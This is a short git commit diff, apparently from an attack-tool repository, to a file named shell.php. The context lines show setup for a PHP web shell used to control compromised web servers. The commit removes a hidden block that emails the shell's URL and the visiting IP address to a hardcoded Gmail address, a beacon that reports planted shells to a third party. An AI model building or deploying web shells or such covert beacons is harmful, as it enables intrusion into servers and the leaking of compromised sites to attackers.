69c1889b7326e31245a30030135f0406aaf31285
cepotz1337 <37271337+cepotz1337@users.noreply.github.com>
2018-03-11 23:50:18 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -10,17 +10,6 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 date_default_timezone_set("Asia/Jakarta");
-<?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'sokincrew@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path 😛 *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Maho", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-?>
     <!DOCTYPE html>
     <html>
     <head>
